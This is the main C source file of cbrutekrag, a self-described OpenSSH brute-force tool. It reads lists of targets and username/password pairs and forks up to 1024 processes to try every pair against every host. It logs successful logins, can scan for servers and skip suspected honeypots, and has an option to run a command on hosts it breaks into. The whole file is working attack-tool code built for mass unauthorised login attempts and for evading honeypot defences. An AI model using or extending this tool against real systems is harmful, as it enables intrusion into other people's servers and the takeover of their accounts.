/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <execinfo.h> /* backtrace, backtrace_symbols_fd */
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h> /* clock */
#include <unistd.h> /* fork */

#include <sys/resource.h> /* rlimit */
#include <sys/wait.h> /* waitpid */

#include "bruteforce_ssh.h"
#include "cbrutekrag.h"
#include "credentials.h"
#include "detection.h"
#include "log.h"
#include "progressbar.h"
#include "str.h"
#include "target.h"

#define NANO_PER_SEC 1000000000.0

int g_verbose = 0;

void print_banner()
{
	printf("\033[92m           _                _       _\n"
	       "          | |              | |     | |\n"
	       "\033[37m      ___\033[92m | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _\n"
	       "\033[37m     / __|\033[92m| '_ \\| '__| | | | __/ _ \\ |/ / '__/ _` |/ _` |\n"
	       "\033[37m    | (__ \033[92m| |_) | |  | |_| | ||  __/   <| | | (_| | (_| |\n"
	       "\033[37m     \\___|\033[92m|_.__/|_|   \\__,_|\\__\\___|_|\\_\\_|  \\__,_|\\__, |\n"
	       "              \033[0m\033[1mOpenSSH Brute force tool 0.5.0\033[0m\033[92m        __/ |\n"
	       "          \033[0m(c) Copyright 2014-2018 Jorge Matricali\033[92m  |___/\033[0m\n\n");
}

void usage(const char *p)
{
	printf("\nusage: %s [-h] [-v] [-aA] [-D] [-P] [-T TARGETS.lst] [-C credentials.lst]\n"
	       "\t\t[-t THREADS] [-o OUTPUT.txt] [-X COMMAND] [TARGETS...]\n\n",
	       p);
}

void err_handler(int sig)
{
	void *array[10];
	int size;

	size = backtrace(array, 10);

	log_error("Error: signal %d:\n", sig);
	backtrace_symbols_fd(array, size, STDERR_FILENO);
	exit(EXIT_FAILURE);
}

int main(int argc, char **argv)
{
	int opt;
	size_t total = 0;
	char *hostnames_filename = NULL;
	char *credentials_filename = NULL;
	char *output_filename = NULL;
	FILE *output = NULL;
	btkg_context_t context = { 3, 1, 0, 0, 0, 0, 0, 0, NULL };
	struct timespec start, end;
	double elapsed;
	struct rlimit limit;
	int tempint;

	/* Error handler */
	signal(SIGSEGV, err_handler);

	/* Ignore SIGPIPE */
	signal(SIGPIPE, SIG_IGN);

	/* Increase the maximum file descriptor number that can be opened by this process. */
	getrlimit(RLIMIT_NOFILE, &limit);
	limit.rlim_cur = limit.rlim_max;
	setrlimit(RLIMIT_NOFILE, &limit);

	/* Calculate maximun number of threads. */
	context.max_threads =
		(limit.rlim_cur > 1024) ? 1024 : limit.rlim_cur - 8;

	while ((opt = getopt(argc, argv, "aAT:C:t:o:DsvVPhX:")) != -1) {
		switch (opt) {
			case 'a':
				context.non_openssh = 1;
				break;
			case 'A':
				context.allow_honeypots = 1;
				break;
			case 'v':
				context.verbose |= CBRUTEKRAG_VERBOSE_MODE;
				g_verbose = context.verbose;
				break;
			case 'V':
				context.verbose |= CBRUTEKRAG_VERBOSE_SSHLIB;
				break;
			case 'T':
				hostnames_filename = strdup(optarg);
				break;
			case 'C':
				credentials_filename = strdup(optarg);
				break;
			case 't':
				tempint = atoi(optarg);
				if (tempint < 1) {
					log_error("Invalid threads size. (%d)",
						  tempint);
					exit(EXIT_FAILURE);
				}
				context.max_threads = (size_t)tempint;
				break;
			case 'o':
				output_filename = strdup(optarg);
				break;
			case 's':
				context.perform_scan = 1;
				break;
			case 'D':
				context.dry_run = 1;
				break;
			case 'P':
				context.progress_bar = 1;
				break;
			case 'X':
				context.command = strdup(optarg);
				break;
			case 'h':
				print_banner();
				usage(argv[0]);
				printf("  -h                This help\n"
				       "  -v                Verbose mode\n"
				       "  -V                Verbose mode (sshlib)\n"
				       "  -s                Scan mode\n"
				       "  -D                Dry run\n"
				       "  -P                Progress bar\n"
				       "  -T <targets>      Targets file\n"
				       "  -C <credentials>  Username and password file\n"
				       "  -t <threads>      Max threads\n"
				       "  -o <output>       Output log file\n"
				       "  -a                Accepts non OpenSSH servers\n"
				       "  -A                Allow servers detected as honeypots.\n"
				       "  -X <command>      Remote command execution.\n");
				exit(EXIT_SUCCESS);
			default:
				usage(argv[0]);
				exit(EXIT_FAILURE);
		}
	}
	print_banner();

	/* Targets */
	btkg_target_list_t target_list;
	btkg_target_list_init(&target_list);

	while (optind < argc) {
		btkg_target_t ret = target_parse(argv[optind]);

		if (ret.host == NULL) {
			log_error(
				"WARNING: An error ocurred parsing target '%s' on argument #%d",
				argv[optind], optind);
			continue;
		}

		btkg_target_list_append_range(&target_list, ret.host, ret.port);
		free(ret.host);
		optind++;
	}

	if (target_list.targets == NULL && hostnames_filename == NULL)
		hostnames_filename = strdup("hostnames.txt");

	if (hostnames_filename != NULL) {
		btkg_target_list_load(&target_list, hostnames_filename);
		free(hostnames_filename);
	}

	if (credentials_filename == NULL)
		credentials_filename = strdup("combos.txt");

	/* Load username/password combinations */
	btkg_credentials_list_t credentials_list;
	btkg_credentials_list_init(&credentials_list);
	btkg_credentials_list_load(&credentials_list, credentials_filename);
	free(credentials_filename);

	/* Calculate total attemps */
	total = target_list.length * credentials_list.length;

	printf("\nAmount of username/password combinations: %zu\n",
	       credentials_list.length);
	printf("Number of targets: %zu\n", target_list.length);
	printf("Total attemps: %zu\n", total);
	printf("Max threads: %zu\n\n", context.max_threads);

	if (total == 0) {
		log_error("No work to do.");
		exit(EXIT_FAILURE);
	}

	if (context.max_threads > target_list.length) {
		log_info("Decreasing max threads to %zu.", target_list.length);
		context.max_threads = target_list.length;
	}

	/* Output file */
	if (output_filename != NULL) {
		output = fopen(output_filename, "a");
		if (output == NULL) {
			log_error("Error opening output file. (%s)",
				  output_filename);
			exit(EXIT_FAILURE);
		}
	}

	/* Port scan and honeypot detection */
	if (context.perform_scan) {
		log_info("Starting servers discoverage process...");
		clock_gettime(CLOCK_MONOTONIC, &start);
		detection_start(&context, &target_list, &target_list,
				context.max_threads);
		clock_gettime(CLOCK_MONOTONIC, &end);
		elapsed = (double)(end.tv_sec - start.tv_sec);
		elapsed += (double)(end.tv_nsec - start.tv_nsec) / NANO_PER_SEC;
		log_info("Detection process took %f seconds.", elapsed);
		log_info("Number of targets after filtering: %zu.",
			 target_list.length);
	}

	if (target_list.length == 0) {
		log_info("No work to do.");
		exit(EXIT_SUCCESS);
	}

	if (context.max_threads > target_list.length) {
		log_info("Decreasing max threads to %zu.", target_list.length);
		context.max_threads = target_list.length;
	}

	/* Bruteforce */
	pid_t pid = 0;
	size_t p = 0;
	size_t count = 0;

	log_info("Starting brute-force process...");
	clock_gettime(CLOCK_MONOTONIC, &start);

	for (size_t x = 0; x < credentials_list.length; x++) {
		btkg_credentials_t credentials =
			credentials_list.credentials[x];

		for (size_t y = 0; y < target_list.length; y++) {
			if (p >= context.max_threads) {
				waitpid(-1, NULL, 0);
				p--;
			}

			btkg_target_t current_target = target_list.targets[y];

			pid = fork();

			if (pid) {
				p++;
			} else if (pid == 0) {
				if (!context.dry_run) {
					bruteforce_ssh_try_login(
						&context, current_target.host,
						current_target.port,
						credentials.username,
						credentials.password, count,
						total, output);
				}
				exit(EXIT_SUCCESS);
			} else {
				log_error("Fork failed!");
			}

			count++;
		}
	}

	/* Wait until all forks finished her work*/
	while (p > 0) {
		waitpid(-1, NULL, 0);
		--p;
	}

	clock_gettime(CLOCK_MONOTONIC, &end);
	elapsed = (double)(end.tv_sec - start.tv_sec);
	elapsed += (double)(end.tv_nsec - start.tv_nsec) / NANO_PER_SEC;

	if (context.progress_bar)
		progressbar_render(count, total, NULL, 0);

	log_info("Brute-force process took %f seconds.", elapsed);

	pid = 0;

	btkg_credentials_list_destroy(&credentials_list);

	if (output != NULL)
		fclose(output);

	exit(EXIT_SUCCESS);
}
